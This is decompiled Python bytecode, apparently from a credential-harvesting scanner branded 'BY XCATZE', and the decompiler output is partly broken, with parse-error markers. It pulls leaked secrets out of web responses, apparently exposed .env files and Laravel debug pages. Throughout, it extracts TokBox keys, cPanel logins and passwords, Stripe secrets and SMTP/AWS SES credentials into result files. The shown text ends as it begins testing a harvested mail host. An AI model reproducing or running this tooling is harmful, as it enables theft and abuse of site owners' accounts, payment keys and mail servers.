 L.1337      5086  LOAD_STR                 'TOKBOX_KEY_DEV'
             5088  LOAD_FAST                'text'
             5090  COMPARE_OP               in
         5092_5094  POP_JUMP_IF_FALSE  5294  'to 5294'
             5096  LOAD_GLOBAL              TOKBOX
             5098  CALL_FUNCTION_0       0  ''
             5100  LOAD_STR                 'on'
             5102  COMPARE_OP               ==
         5104_5106  POP_JUMP_IF_FALSE  5294  'to 5294'

 L.1338      5108  LOAD_STR                 'TOKBOX_KEY_DEV='
             5110  LOAD_FAST                'text'
             5112  COMPARE_OP               in
         5114_5116  POP_JUMP_IF_FALSE  5500  'to 5500'

 L.1339      5118  SETUP_FINALLY      5138  'to 5138'

 L.1340      5120  LOAD_GLOBAL              reg
             5122  LOAD_STR                 '\nTOKBOX_KEY_DEV=(.*?)\n'
             5124  LOAD_FAST                'text'
             5126  CALL_FUNCTION_2       2  ''
             5128  LOAD_CONST               0
             5130  BINARY_SUBSCR    
             5132  STORE_FAST               'tokbox_key'
             5134  POP_BLOCK        
             5136  JUMP_FORWARD       5154  'to 5154'
           5138_0  COME_FROM_FINALLY  5118  '5118'

 L.1341      5138  POP_TOP          
             5140  POP_TOP          
             5142  POP_TOP          

 L.1342      5144  LOAD_STR                 ''
             5146  STORE_FAST               'tokbox_key'
             5148  POP_EXCEPT       
             5150  JUMP_FORWARD       5154  'to 5154'
             5152  END_FINALLY      
           5154_0  COME_FROM          5150  '5150'
           5154_1  COME_FROM          5136  '5136'

 L.1343      5154  SETUP_FINALLY      5174  'to 5174'

 L.1344      5156  LOAD_GLOBAL              reg
             5158  LOAD_STR                 '\nTOKBOX_SECRET_DEV=(.*?)\n'
             5160  LOAD_FAST                'text'
             5162  CALL_FUNCTION_2       2  ''
             5164  LOAD_CONST               0
             5166  BINARY_SUBSCR    
             5168  STORE_FAST               'tokbox_secret'
             5170  POP_BLOCK        
             5172  JUMP_FORWARD       5190  'to 5190'
           5174_0  COME_FROM_FINALLY  5154  '5154'

 L.1345      5174  POP_TOP          
             5176  POP_TOP          
             5178  POP_TOP          

 L.1346      5180  LOAD_STR                 ''
             5182  STORE_FAST               'tokbox_secret'
             5184  POP_EXCEPT       
             5186  JUMP_FORWARD       5190  'to 5190'
             5188  END_FINALLY      
           5190_0  COME_FROM          5186  '5186'
           5190_1  COME_FROM          5172  '5172'

 L.1347      5190  LOAD_GLOBAL              print
             5192  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mTOKBOX\n'
             5194  LOAD_METHOD              format
             5196  LOAD_GLOBAL              str
             5198  LOAD_FAST                'url'
             5200  CALL_FUNCTION_1       1  ''
             5202  CALL_METHOD_1         1  ''
             5204  CALL_FUNCTION_1       1  ''
             5206  POP_TOP          

 L.1348      5208  LOAD_STR                 'URL: '
             5210  LOAD_GLOBAL              str
             5212  LOAD_FAST                'url'
             5214  CALL_FUNCTION_1       1  ''
             5216  BINARY_ADD       
             5218  LOAD_STR                 '\nTOKBOX_KEY_DEV: '
             5220  BINARY_ADD       
             5222  LOAD_GLOBAL              str
             5224  LOAD_FAST                'tokbox_key'
             5226  CALL_FUNCTION_1       1  ''
             5228  BINARY_ADD       
             5230  LOAD_STR                 '\nTOKBOX_SECRET_DEV: '
             5232  BINARY_ADD       
             5234  LOAD_GLOBAL              str
             5236  LOAD_FAST                'tokbox_secret'
             5238  CALL_FUNCTION_1       1  ''
             5240  BINARY_ADD       
             5242  STORE_FAST               'build'

 L.1349      5244  LOAD_GLOBAL              str
             5246  LOAD_FAST                'build'
             5248  CALL_FUNCTION_1       1  ''
             5250  LOAD_METHOD              replace
             5252  LOAD_STR                 '\r'
             5254  LOAD_STR                 ''
             5256  CALL_METHOD_2         2  ''
             5258  STORE_FAST               'remover'

 L.1350      5260  LOAD_GLOBAL              open
             5262  LOAD_STR                 'result/TOKBOX.txt'
             5264  LOAD_STR                 'a'
             5266  CALL_FUNCTION_2       2  ''
             5268  STORE_FAST               'save'

 L.1351      5270  LOAD_FAST                'save'
             5272  LOAD_METHOD              write
             5274  LOAD_FAST                'remover'
             5276  LOAD_STR                 '\n\n'
             5278  BINARY_ADD       
             5280  CALL_METHOD_1         1  ''
             5282  POP_TOP          

 L.1352      5284  LOAD_FAST                'save'
             5286  LOAD_METHOD              close
             5288  CALL_METHOD_0         0  ''
             5290  POP_TOP          
             5292  JUMP_FORWARD       5500  'to 5500'
           5294_0  COME_FROM          5104  '5104'
           5294_1  COME_FROM          5092  '5092'

 L.1353      5294  LOAD_STR                 'TOKBOX_KEY'
             5296  LOAD_FAST                'text'
             5298  COMPARE_OP               in
         5300_5302  POP_JUMP_IF_FALSE  5500  'to 5500'
             5304  LOAD_GLOBAL              TOKBOX
             5306  CALL_FUNCTION_0       0  ''
             5308  LOAD_STR                 'on'
             5310  COMPARE_OP               ==
         5312_5314  POP_JUMP_IF_FALSE  5500  'to 5500'

 L.1354      5316  LOAD_STR                 'TOKBOX_KEY='
             5318  LOAD_FAST                'text'
             5320  COMPARE_OP               in
         5322_5324  POP_JUMP_IF_FALSE  5500  'to 5500'

 L.1355      5326  SETUP_FINALLY      5346  'to 5346'

 L.1356      5328  LOAD_GLOBAL              reg
             5330  LOAD_STR                 '\nTOKBOX_KEY=(.*?)\n'
             5332  LOAD_FAST                'text'
             5334  CALL_FUNCTION_2       2  ''
             5336  LOAD_CONST               0
             5338  BINARY_SUBSCR    
             5340  STORE_FAST               'tokbox_key'
             5342  POP_BLOCK        
             5344  JUMP_FORWARD       5362  'to 5362'
           5346_0  COME_FROM_FINALLY  5326  '5326'

 L.1357      5346  POP_TOP          
             5348  POP_TOP          
             5350  POP_TOP          

 L.1358      5352  LOAD_STR                 ''
             5354  STORE_FAST               'tokbox_key'
             5356  POP_EXCEPT       
             5358  JUMP_FORWARD       5362  'to 5362'
             5360  END_FINALLY      
           5362_0  COME_FROM          5358  '5358'
           5362_1  COME_FROM          5344  '5344'

 L.1359      5362  SETUP_FINALLY      5382  'to 5382'

 L.1360      5364  LOAD_GLOBAL              reg
             5366  LOAD_STR                 '\nTOKBOX_SECRET=(.*?)\n'
             5368  LOAD_FAST                'text'
             5370  CALL_FUNCTION_2       2  ''
             5372  LOAD_CONST               0
             5374  BINARY_SUBSCR    
             5376  STORE_FAST               'tokbox_secret'
             5378  POP_BLOCK        
             5380  JUMP_FORWARD       5398  'to 5398'
           5382_0  COME_FROM_FINALLY  5362  '5362'

 L.1361      5382  POP_TOP          
             5384  POP_TOP          
             5386  POP_TOP          

 L.1362      5388  LOAD_STR                 ''
             5390  STORE_FAST               'tokbox_secret'
             5392  POP_EXCEPT       
             5394  JUMP_FORWARD       5398  'to 5398'
             5396  END_FINALLY      
           5398_0  COME_FROM          5394  '5394'
           5398_1  COME_FROM          5380  '5380'

 L.1363      5398  LOAD_GLOBAL              print
             5400  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mTOKBOX\n'
             5402  LOAD_METHOD              format
             5404  LOAD_GLOBAL              str
             5406  LOAD_FAST                'url'
             5408  CALL_FUNCTION_1       1  ''
             5410  CALL_METHOD_1         1  ''
             5412  CALL_FUNCTION_1       1  ''
             5414  POP_TOP          

 L.1364      5416  LOAD_STR                 'URL: '
             5418  LOAD_GLOBAL              str
             5420  LOAD_FAST                'url'
             5422  CALL_FUNCTION_1       1  ''
             5424  BINARY_ADD       
             5426  LOAD_STR                 '\nTOKBOX_KEY_DEV: '
             5428  BINARY_ADD       
             5430  LOAD_GLOBAL              str
             5432  LOAD_FAST                'tokbox_key'
             5434  CALL_FUNCTION_1       1  ''
             5436  BINARY_ADD       
             5438  LOAD_STR                 '\nTOKBOX_SECRET_DEV: '
             5440  BINARY_ADD       
             5442  LOAD_GLOBAL              str
             5444  LOAD_FAST                'tokbox_secret'
             5446  CALL_FUNCTION_1       1  ''
             5448  BINARY_ADD       
             5450  STORE_FAST               'build'

 L.1365      5452  LOAD_GLOBAL              str
             5454  LOAD_FAST                'build'
             5456  CALL_FUNCTION_1       1  ''
             5458  LOAD_METHOD              replace
             5460  LOAD_STR                 '\r'
             5462  LOAD_STR                 ''
             5464  CALL_METHOD_2         2  ''
             5466  STORE_FAST               'remover'

 L.1366      5468  LOAD_GLOBAL              open
             5470  LOAD_STR                 'result/TOKBOX.txt'
             5472  LOAD_STR                 'a'
             5474  CALL_FUNCTION_2       2  ''
             5476  STORE_FAST               'save'

 L.1367      5478  LOAD_FAST                'save'
             5480  LOAD_METHOD              write
             5482  LOAD_FAST                'remover'
             5484  LOAD_STR                 '\n\n'
             5486  BINARY_ADD       
             5488  CALL_METHOD_1         1  ''
             5490  POP_TOP          

 L.1368      5492  LOAD_FAST                'save'
             5494  LOAD_METHOD              close
             5496  CALL_METHOD_0         0  ''
             5498  POP_TOP          
           5500_0  COME_FROM          5322  '5322'
           5500_1  COME_FROM          5312  '5312'
           5500_2  COME_FROM          5300  '5300'
           5500_3  COME_FROM          5292  '5292'
           5500_4  COME_FROM          5114  '5114'

 L.1371      5500  LOAD_STR                 'CPANEL_HOST='
             5502  LOAD_FAST                'text'
             5504  COMPARE_OP               in
         5506_5508  POP_JUMP_IF_FALSE  5762  'to 5762'

 L.1372      5510  SETUP_FINALLY      5530  'to 5530'

 L.1373      5512  LOAD_GLOBAL              reg
             5514  LOAD_STR                 '\nCPANEL_HOST=(.*?)\n'
             5516  LOAD_FAST                'text'
             5518  CALL_FUNCTION_2       2  ''
             5520  LOAD_CONST               0
             5522  BINARY_SUBSCR    
             5524  STORE_FAST               'cipanel_host'
             5526  POP_BLOCK        
             5528  JUMP_FORWARD       5546  'to 5546'
           5530_0  COME_FROM_FINALLY  5510  '5510'

 L.1374      5530  POP_TOP          
             5532  POP_TOP          
             5534  POP_TOP          

 L.1375      5536  LOAD_STR                 ''
             5538  STORE_FAST               'cipanel_host'
             5540  POP_EXCEPT       
             5542  JUMP_FORWARD       5546  'to 5546'
             5544  END_FINALLY      
           5546_0  COME_FROM          5542  '5542'
           5546_1  COME_FROM          5528  '5528'

 L.1376      5546  SETUP_FINALLY      5566  'to 5566'

 L.1377      5548  LOAD_GLOBAL              reg
             5550  LOAD_STR                 '\nCPANEL_PORT=(.*?)\n'
             5552  LOAD_FAST                'text'
             5554  CALL_FUNCTION_2       2  ''
             5556  LOAD_CONST               0
             5558  BINARY_SUBSCR    
             5560  STORE_FAST               'cipanel_port'
             5562  POP_BLOCK        
             5564  JUMP_FORWARD       5582  'to 5582'
           5566_0  COME_FROM_FINALLY  5546  '5546'

 L.1378      5566  POP_TOP          
             5568  POP_TOP          
             5570  POP_TOP          

 L.1379      5572  LOAD_STR                 ''
             5574  STORE_FAST               'cipanel_port'
             5576  POP_EXCEPT       
             5578  JUMP_FORWARD       5582  'to 5582'
             5580  END_FINALLY      
           5582_0  COME_FROM          5578  '5578'
           5582_1  COME_FROM          5564  '5564'

 L.1380      5582  SETUP_FINALLY      5602  'to 5602'

 L.1381      5584  LOAD_GLOBAL              reg
             5586  LOAD_STR                 '\nCPANEL_USERNAME=(.*?)\n'
             5588  LOAD_FAST                'text'
             5590  CALL_FUNCTION_2       2  ''
             5592  LOAD_CONST               0
             5594  BINARY_SUBSCR    
             5596  STORE_FAST               'cipanel_user'
             5598  POP_BLOCK        
             5600  JUMP_FORWARD       5618  'to 5618'
           5602_0  COME_FROM_FINALLY  5582  '5582'

 L.1382      5602  POP_TOP          
             5604  POP_TOP          
             5606  POP_TOP          

 L.1383      5608  LOAD_STR                 ''
             5610  STORE_FAST               'cipanel_user'
             5612  POP_EXCEPT       
             5614  JUMP_FORWARD       5618  'to 5618'
             5616  END_FINALLY      
           5618_0  COME_FROM          5614  '5614'
           5618_1  COME_FROM          5600  '5600'

 L.1384      5618  SETUP_FINALLY      5638  'to 5638'

 L.1385      5620  LOAD_GLOBAL              reg
             5622  LOAD_STR                 '\nCPANEL_PASSWORD=(.*?)\n'
             5624  LOAD_FAST                'text'
             5626  CALL_FUNCTION_2       2  ''
             5628  LOAD_CONST               0
             5630  BINARY_SUBSCR    
             5632  STORE_FAST               'cipanel_pw'
             5634  POP_BLOCK        
             5636  JUMP_FORWARD       5654  'to 5654'
           5638_0  COME_FROM_FINALLY  5618  '5618'

 L.1386      5638  POP_TOP          
             5640  POP_TOP          
             5642  POP_TOP          

 L.1387      5644  LOAD_STR                 ''
             5646  STORE_FAST               'cipanel_pw'
             5648  POP_EXCEPT       
             5650  JUMP_FORWARD       5654  'to 5654'
             5652  END_FINALLY      
           5654_0  COME_FROM          5650  '5650'
           5654_1  COME_FROM          5636  '5636'

 L.1388      5654  LOAD_STR                 'URL: '
             5656  LOAD_GLOBAL              str
             5658  LOAD_FAST                'url'
             5660  CALL_FUNCTION_1       1  ''
             5662  BINARY_ADD       
             5664  LOAD_STR                 '\nCPANEL_HOST: '
             5666  BINARY_ADD       
             5668  LOAD_GLOBAL              str
             5670  LOAD_FAST                'cipanel_host'
             5672  CALL_FUNCTION_1       1  ''
             5674  BINARY_ADD       
             5676  LOAD_STR                 '\nCPANEL_PORT: '
             5678  BINARY_ADD       
             5680  LOAD_GLOBAL              str
             5682  LOAD_FAST                'cipanel_port'
             5684  CALL_FUNCTION_1       1  ''
             5686  BINARY_ADD       
             5688  LOAD_STR                 '\nCPANEL_USERNAME: '
             5690  BINARY_ADD       
             5692  LOAD_GLOBAL              str
             5694  LOAD_FAST                'cipanel_user'
             5696  CALL_FUNCTION_1       1  ''
             5698  BINARY_ADD       
             5700  LOAD_STR                 '\nCPANEL_PASSWORD: '
             5702  BINARY_ADD       
             5704  LOAD_GLOBAL              str
             5706  LOAD_FAST                'cipanel_pw'
             5708  CALL_FUNCTION_1       1  ''
             5710  BINARY_ADD       
             5712  STORE_FAST               'build'

 L.1389      5714  LOAD_GLOBAL              str
             5716  LOAD_FAST                'build'
             5718  CALL_FUNCTION_1       1  ''
             5720  LOAD_METHOD              replace
             5722  LOAD_STR                 '\r'
             5724  LOAD_STR                 ''
             5726  CALL_METHOD_2         2  ''
             5728  STORE_FAST               'remover'

 L.1390      5730  LOAD_GLOBAL              open
             5732  LOAD_STR                 'result/CPANEL.txt'
             5734  LOAD_STR                 'a'
             5736  CALL_FUNCTION_2       2  ''
             5738  STORE_FAST               'save'

 L.1391      5740  LOAD_FAST                'save'
             5742  LOAD_METHOD              write
             5744  LOAD_FAST                'remover'
             5746  LOAD_STR                 '\n\n'
             5748  BINARY_ADD       
             5750  CALL_METHOD_1         1  ''
             5752  POP_TOP          

 L.1392      5754  LOAD_FAST                'save'
             5756  LOAD_METHOD              close
             5758  CALL_METHOD_0         0  ''
             5760  POP_TOP          
           5762_0  COME_FROM          5506  '5506'

 L.1394      5762  LOAD_STR                 'STRIPE_KEY='
             5764  LOAD_FAST                'text'
             5766  COMPARE_OP               in
         5768_5770  POP_JUMP_IF_FALSE  5928  'to 5928'

 L.1395      5772  SETUP_FINALLY      5792  'to 5792'

 L.1396      5774  LOAD_GLOBAL              reg
             5776  LOAD_STR                 '\nSTRIPE_KEY=(.*?)\n'
             5778  LOAD_FAST                'text'
             5780  CALL_FUNCTION_2       2  ''
             5782  LOAD_CONST               0
             5784  BINARY_SUBSCR    
             5786  STORE_FAST               'stripe_1'
             5788  POP_BLOCK        
             5790  JUMP_FORWARD       5808  'to 5808'
           5792_0  COME_FROM_FINALLY  5772  '5772'

 L.1397      5792  POP_TOP          
             5794  POP_TOP          
             5796  POP_TOP          

 L.1398      5798  LOAD_STR                 ''
             5800  STORE_FAST               'stripe_1'
             5802  POP_EXCEPT       
             5804  JUMP_FORWARD       5808  'to 5808'
             5806  END_FINALLY      
           5808_0  COME_FROM          5804  '5804'
           5808_1  COME_FROM          5790  '5790'

 L.1399      5808  SETUP_FINALLY      5828  'to 5828'

 L.1400      5810  LOAD_GLOBAL              reg
             5812  LOAD_STR                 '\nSTRIPE_SECRET=(.*?)\n'
             5814  LOAD_FAST                'text'
             5816  CALL_FUNCTION_2       2  ''
             5818  LOAD_CONST               0
             5820  BINARY_SUBSCR    
             5822  STORE_FAST               'stripe_2'
             5824  POP_BLOCK        
             5826  JUMP_FORWARD       5844  'to 5844'
           5828_0  COME_FROM_FINALLY  5808  '5808'

 L.1401      5828  POP_TOP          
             5830  POP_TOP          
             5832  POP_TOP          

 L.1402      5834  LOAD_STR                 ''
             5836  STORE_FAST               'stripe_2'
             5838  POP_EXCEPT       
             5840  JUMP_FORWARD       5844  'to 5844'
             5842  END_FINALLY      
           5844_0  COME_FROM          5840  '5840'
           5844_1  COME_FROM          5826  '5826'

 L.1403      5844  LOAD_STR                 'URL: '
             5846  LOAD_GLOBAL              str
             5848  LOAD_FAST                'url'
             5850  CALL_FUNCTION_1       1  ''
             5852  BINARY_ADD       
             5854  LOAD_STR                 '\nSTRIPE_KEY: '
             5856  BINARY_ADD       
             5858  LOAD_GLOBAL              str
             5860  LOAD_FAST                'stripe_1'
             5862  CALL_FUNCTION_1       1  ''
             5864  BINARY_ADD       
             5866  LOAD_STR                 '\nSTRIPE_SECRET: '
             5868  BINARY_ADD       
             5870  LOAD_GLOBAL              str
             5872  LOAD_FAST                'stripe_2'
             5874  CALL_FUNCTION_1       1  ''
             5876  BINARY_ADD       
             5878  STORE_FAST               'build'

 L.1404      5880  LOAD_GLOBAL              str
             5882  LOAD_FAST                'build'
             5884  CALL_FUNCTION_1       1  ''
             5886  LOAD_METHOD              replace
             5888  LOAD_STR                 '\r'
             5890  LOAD_STR                 ''
             5892  CALL_METHOD_2         2  ''
             5894  STORE_FAST               'remover'

 L.1405      5896  LOAD_GLOBAL              open
             5898  LOAD_STR                 'Result/STRIPE_KEY.txt'
             5900  LOAD_STR                 'a'
             5902  CALL_FUNCTION_2       2  ''
             5904  STORE_FAST               'save'

 L.1406      5906  LOAD_FAST                'save'
             5908  LOAD_METHOD              write
             5910  LOAD_FAST                'remover'
             5912  LOAD_STR                 '\n\n'
             5914  BINARY_ADD       
             5916  CALL_METHOD_1         1  ''
             5918  POP_TOP          

 L.1407      5920  LOAD_FAST                'save'
             5922  LOAD_METHOD              close
             5924  CALL_METHOD_0         0  ''
             5926  POP_TOP          
           5928_0  COME_FROM          5768  '5768'
             5928  POP_BLOCK        
             5930  JUMP_FORWARD       5968  'to 5968'
           5932_0  COME_FROM_FINALLY     0  '0'

 L.1409      5932  DUP_TOP          
             5934  LOAD_GLOBAL              Exception
             5936  COMPARE_OP               exception-match
         5938_5940  POP_JUMP_IF_FALSE  5966  'to 5966'
             5942  POP_TOP          
             5944  STORE_FAST               'e'
             5946  POP_TOP          
             5948  SETUP_FINALLY      5954  'to 5954'

 L.1410      5950  POP_BLOCK        
             5952  BEGIN_FINALLY    
           5954_0  COME_FROM_FINALLY  5948  '5948'
             5954  LOAD_CONST               None
             5956  STORE_FAST               'e'
             5958  DELETE_FAST              'e'
             5960  END_FINALLY      
             5962  POP_EXCEPT       
             5964  JUMP_FORWARD       5968  'to 5968'
           5966_0  COME_FROM          5938  '5938'
             5966  END_FINALLY      
           5968_0  COME_FROM          5964  '5964'
           5968_1  COME_FROM          5930  '5930'

Parse error at or near `JUMP_FORWARD' instruction at offset 1614


def get_smtp2--- This code section failed: ---

 L.1421       0_2  SETUP_FINALLY      5966  'to 5966'

 L.1422         4  LOAD_STR                 '<td>MAIL_HOST</td>'
                6  LOAD_FAST                'text'
                8  COMPARE_OP               in
            10_12  POP_JUMP_IF_FALSE  1730  'to 1730'

 L.1423        14  LOAD_STR                 '<td>MAIL_HOST</td>'
               16  LOAD_FAST                'text'
               18  COMPARE_OP               in
            20_22  POP_JUMP_IF_FALSE  1748  'to 1748'

 L.1424        24  LOAD_GLOBAL              reg
               26  LOAD_STR                 '<td>MAIL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
               28  LOAD_FAST                'text'
               30  CALL_FUNCTION_2       2  ''
               32  LOAD_CONST               0
               34  BINARY_SUBSCR    
               36  STORE_FAST               'mailhost'

 L.1425        38  SETUP_FINALLY        58  'to 58'

 L.1426        40  LOAD_GLOBAL              reg
               42  LOAD_STR                 '<td>MAIL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
               44  LOAD_FAST                'text'
               46  CALL_FUNCTION_2       2  ''
               48  LOAD_CONST               0
               50  BINARY_SUBSCR    
               52  STORE_FAST               'mailport'
               54  POP_BLOCK        
               56  JUMP_FORWARD         74  'to 74'
             58_0  COME_FROM_FINALLY    38  '38'

 L.1427        58  POP_TOP          
               60  POP_TOP          
               62  POP_TOP          

 L.1428        64  LOAD_CONST               587
               66  STORE_FAST               'mailport'
               68  POP_EXCEPT       
               70  JUMP_FORWARD         74  'to 74'
               72  END_FINALLY      
             74_0  COME_FROM            70  '70'
             74_1  COME_FROM            56  '56'

 L.1429        74  LOAD_GLOBAL              reg
               76  LOAD_STR                 '<td>MAIL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
               78  LOAD_FAST                'text'
               80  CALL_FUNCTION_2       2  ''
               82  LOAD_CONST               0
               84  BINARY_SUBSCR    
               86  STORE_FAST               'mailuser'

 L.1430        88  LOAD_GLOBAL              reg
               90  LOAD_STR                 '<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
               92  LOAD_FAST                'text'
               94  CALL_FUNCTION_2       2  ''
               96  LOAD_CONST               0
               98  BINARY_SUBSCR    
              100  STORE_FAST               'mailpass'

 L.1431       102  SETUP_FINALLY       122  'to 122'

 L.1432       104  LOAD_GLOBAL              reg
              106  LOAD_STR                 '<td>MAIL_FROM_ADDRESS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
              108  LOAD_FAST                'text'
              110  CALL_FUNCTION_2       2  ''
              112  LOAD_CONST               0
              114  BINARY_SUBSCR    
              116  STORE_FAST               'mailfrom'
              118  POP_BLOCK        
              120  JUMP_FORWARD        138  'to 138'
            122_0  COME_FROM_FINALLY   102  '102'

 L.1433       122  POP_TOP          
              124  POP_TOP          
              126  POP_TOP          

 L.1434       128  LOAD_STR                 'unknown@unknown.com'
              130  STORE_FAST               'mailfrom'
              132  POP_EXCEPT       
              134  JUMP_FORWARD        138  'to 138'
              136  END_FINALLY      
            138_0  COME_FROM           134  '134'
            138_1  COME_FROM           120  '120'

 L.1435       138  LOAD_STR                 'URL: '
              140  LOAD_GLOBAL              str
              142  LOAD_FAST                'url'
              144  CALL_FUNCTION_1       1  ''
              146  BINARY_ADD       
              148  LOAD_STR                 '\nMAILHOST: '
              150  BINARY_ADD       
              152  LOAD_GLOBAL              str
              154  LOAD_FAST                'mailhost'
              156  CALL_FUNCTION_1       1  ''
              158  BINARY_ADD       
              160  LOAD_STR                 '\nMAILPORT: '
              162  BINARY_ADD       
              164  LOAD_GLOBAL              str
              166  LOAD_FAST                'mailport'
              168  CALL_FUNCTION_1       1  ''
              170  BINARY_ADD       
              172  LOAD_STR                 '\nMAILUSER: '
              174  BINARY_ADD       
              176  LOAD_GLOBAL              str
              178  LOAD_FAST                'mailuser'
              180  CALL_FUNCTION_1       1  ''
              182  BINARY_ADD       
              184  LOAD_STR                 '\nMAILPASS: '
              186  BINARY_ADD       
              188  LOAD_GLOBAL              str
              190  LOAD_FAST                'mailpass'
              192  CALL_FUNCTION_1       1  ''
              194  BINARY_ADD       
              196  LOAD_STR                 '\nMAILFROM: '
              198  BINARY_ADD       
              200  LOAD_GLOBAL              str
              202  LOAD_FAST                'mailfrom'
              204  CALL_FUNCTION_1       1  ''
              206  BINARY_ADD       
              208  STORE_FAST               'build'

 L.1436       210  LOAD_GLOBAL              str
              212  LOAD_FAST                'build'
              214  CALL_FUNCTION_1       1  ''
              216  LOAD_METHOD              replace
              218  LOAD_STR                 '\r'
              220  LOAD_STR                 ''
              222  CALL_METHOD_2         2  ''
              224  STORE_FAST               'remover'

 L.1438       226  LOAD_STR                 '.amazonaws.com'
              228  LOAD_FAST                'text'
              230  COMPARE_OP               in
          232_234  POP_JUMP_IF_FALSE   574  'to 574'
              236  LOAD_GLOBAL              aws
              238  CALL_FUNCTION_0       0  ''
              240  LOAD_STR                 'on'
              242  COMPARE_OP               ==
          244_246  POP_JUMP_IF_FALSE   574  'to 574'

 L.1439       248  LOAD_GLOBAL              reg
              250  LOAD_STR                 '\nMAIL_HOST=(.*?)\n'
              252  LOAD_FAST                'text'
              254  CALL_FUNCTION_2       2  ''
              256  LOAD_CONST               0
              258  BINARY_SUBSCR    
              260  STORE_FAST               'mailhost'

 L.1440       262  LOAD_GLOBAL              reg
              264  LOAD_STR                 '\nMAIL_PORT=(.*?)\n'
              266  LOAD_FAST                'text'
              268  CALL_FUNCTION_2       2  ''
              270  LOAD_CONST               0
              272  BINARY_SUBSCR    
              274  STORE_FAST               'mailport'

 L.1441       276  LOAD_GLOBAL              reg
              278  LOAD_STR                 '\nMAIL_USERNAME=(.*?)\n'
              280  LOAD_FAST                'text'
              282  CALL_FUNCTION_2       2  ''
              284  LOAD_CONST               0
              286  BINARY_SUBSCR    
              288  STORE_FAST               'mailuser'

 L.1442       290  LOAD_GLOBAL              reg
              292  LOAD_STR                 '\nMAIL_PASSWORD=(.*?)\n'
              294  LOAD_FAST                'text'
              296  CALL_FUNCTION_2       2  ''
              298  LOAD_CONST               0
              300  BINARY_SUBSCR    
              302  STORE_FAST               'mailpass'

 L.1443       304  LOAD_STR                 'MAIL_FROM'
              306  LOAD_FAST                'text'
              308  COMPARE_OP               in
          310_312  POP_JUMP_IF_FALSE   330  'to 330'

 L.1444       314  LOAD_GLOBAL              reg
              316  LOAD_STR                 '\nMAIL_FROM_ADDRESS=(.*?)\n'
              318  LOAD_FAST                'text'
              320  CALL_FUNCTION_2       2  ''
              322  LOAD_CONST               0
              324  BINARY_SUBSCR    
              326  STORE_FAST               'emailform'
              328  JUMP_FORWARD        334  'to 334'
            330_0  COME_FROM           310  '310'

 L.1446       330  LOAD_STR                 'UNKNOWN'
              332  STORE_FAST               'emailform'
            334_0  COME_FROM           328  '328'

 L.1447       334  LOAD_GLOBAL              reg
              336  LOAD_STR                 'email-smtp.(.*?).amazonaws.com'
              338  LOAD_FAST                'mailhost'
              340  CALL_FUNCTION_2       2  ''
              342  LOAD_CONST               0
              344  BINARY_SUBSCR    
              346  STORE_FAST               'getcountry'

 L.1448       348  LOAD_STR                 'URL: '
              350  LOAD_GLOBAL              str
              352  LOAD_FAST                'url'
              354  CALL_FUNCTION_1       1  ''
              356  BINARY_ADD       
              358  LOAD_STR                 '\nMAILHOST: '
              360  BINARY_ADD       
              362  LOAD_GLOBAL              str
              364  LOAD_FAST                'mailhost'
              366  CALL_FUNCTION_1       1  ''
              368  BINARY_ADD       
              370  LOAD_STR                 '\nMAILPORT: '
              372  BINARY_ADD       
              374  LOAD_GLOBAL              str
              376  LOAD_FAST                'mailport'
              378  CALL_FUNCTION_1       1  ''
              380  BINARY_ADD       
              382  LOAD_STR                 '\nMAILUSER: '
              384  BINARY_ADD       
              386  LOAD_GLOBAL              str
              388  LOAD_FAST                'mailuser'
              390  CALL_FUNCTION_1       1  ''
              392  BINARY_ADD       
              394  LOAD_STR                 '\nMAILPASS: '
              396  BINARY_ADD       
              398  LOAD_GLOBAL              str
              400  LOAD_FAST                'mailpass'
              402  CALL_FUNCTION_1       1  ''
              404  BINARY_ADD       
              406  LOAD_STR                 '\nMAILFROM: '
              408  BINARY_ADD       
              410  LOAD_GLOBAL              str
              412  LOAD_FAST                'emailform'
              414  CALL_FUNCTION_1       1  ''
              416  BINARY_ADD       
              418  STORE_FAST               'build'

 L.1449       420  LOAD_GLOBAL              str
              422  LOAD_FAST                'build'
              424  CALL_FUNCTION_1       1  ''
              426  LOAD_METHOD              replace
              428  LOAD_STR                 '\r'
              430  LOAD_STR                 ''
              432  CALL_METHOD_2         2  ''
              434  STORE_FAST               'remover'

 L.1450       436  LOAD_GLOBAL              print
              438  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40m amazonaws\n'
              440  LOAD_METHOD              format
              442  LOAD_GLOBAL              str
              444  LOAD_FAST                'url'
              446  CALL_FUNCTION_1       1  ''
              448  CALL_METHOD_1         1  ''
              450  CALL_FUNCTION_1       1  ''
              452  POP_TOP          

 L.1451       454  LOAD_GLOBAL              open
              456  LOAD_STR                 'result/'
              458  LOAD_FAST                'getcountry'
              460  BINARY_ADD       
              462  LOAD_STR                 '.txt'
              464  BINARY_ADD       
              466  LOAD_STR                 'a'
              468  CALL_FUNCTION_2       2  ''
              470  STORE_FAST               'save'

 L.1452       472  LOAD_FAST                'save'
              474  LOAD_METHOD              write
              476  LOAD_GLOBAL              str
              478  LOAD_FAST                'remover'
              480  CALL_FUNCTION_1       1  ''
              482  LOAD_STR                 '\n\n'
              484  BINARY_ADD       
              486  CALL_METHOD_1         1  ''
              488  POP_TOP          

 L.1453       490  LOAD_FAST                'save'
              492  LOAD_METHOD              close
              494  CALL_METHOD_0         0  ''
              496  POP_TOP          

 L.1454       498  LOAD_GLOBAL              open
              500  LOAD_STR                 'result/smtp_aws_ses.txt'
              502  LOAD_STR                 'a'
              504  CALL_FUNCTION_2       2  ''
              506  STORE_FAST               'save2'

 L.1455       508  LOAD_FAST                'save2'
              510  LOAD_METHOD              write
              512  LOAD_GLOBAL              str
              514  LOAD_FAST                'remover'
              516  CALL_FUNCTION_1       1  ''
              518  LOAD_STR                 '\n\n'
              520  BINARY_ADD       
              522  CALL_METHOD_1         1  ''
              524  POP_TOP          

 L.1456       526  LOAD_FAST                'save2'
              528  LOAD_METHOD              close
              530  CALL_METHOD_0         0  ''
              532  POP_TOP          

 L.1457       534  SETUP_FINALLY       558  'to 558'

 L.1458       536  LOAD_GLOBAL              sendtest
              538  LOAD_FAST                'url'
              540  LOAD_FAST                'mailhost'
